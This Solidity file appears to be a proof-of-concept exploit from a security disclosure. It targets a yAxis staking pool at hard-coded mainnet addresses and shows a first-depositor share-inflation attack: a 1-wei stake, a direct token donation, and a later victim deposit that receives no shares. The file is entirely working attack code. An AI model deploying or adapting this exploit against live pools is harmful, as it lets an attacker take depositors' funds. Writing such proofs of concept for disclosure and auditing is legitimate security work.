// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

interface IERC20 {
    function transfer(address dst, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function totalSupply() external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface Staking is IERC20 {

    function enter(uint _amount) external;
    function epEndBlks(uint256 _index) external view returns(uint256);
    function availableBalance() external view returns (uint);
}

interface IUniswapV2Router02 {
    function WETH() external returns (address);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract YAxisStakingPOC {
    Staking public constant stakingPool =
        Staking(0xeF31Cb88048416E301Fee1eA13e7664b887BA7e8);
    IWETH public constant token0 =
        IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); //WETH
    IERC20 public constant token1 =
        IERC20(0xb1dC9124c395c1e97773ab855d66E879f053A289); //yax

    uint256 public constant z = 10 ether; // this number is controlled by the attacker. They will make it as big as possible

    constructor() payable {
        require(
            msg.value >= 100 ether,
            "give me some eth to be able to get WETH and yax"
        );
        setup();
        attack();
        victimInteraction();
    }

    function setup() internal {
        IUniswapV2Router02 uniswapV2Router02 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        address WETH = uniswapV2Router02.WETH();
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(token1);

        //swap some ETH for yax
        uint256 ethAmount = 25 ether;
        uniswapV2Router02.swapExactETHForTokens{value: ethAmount}(
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function attack() public {
        require(
            stakingPool.totalSupply() == 0,
            "attack only possible when totalSupply of pool token is zero"
        );

        // step 1: mint some LP tokens
        token1.approve(address(stakingPool), 1);

        stakingPool.enter(1);

        // step 2: transfer z dollars worth of token1 directly to the Pool address
        token1.transfer(address(stakingPool), z);
    }

    //cal this function after attack() function
    function victimInteraction() public {
        uint256 sYAXTokenBalance = stakingPool.balanceOf(address(this));
        //here the someone tries to add lquidity with less than z dollar worth of tokens
        uint256 victimAmount = z / 2;
        token1.approve(address(stakingPool), victimAmount);

        stakingPool.enter(victimAmount);
        require(
            sYAXTokenBalance == stakingPool.balanceOf(address(this)),
            "attack was not successfull"
        );
    }
}

// block=11173210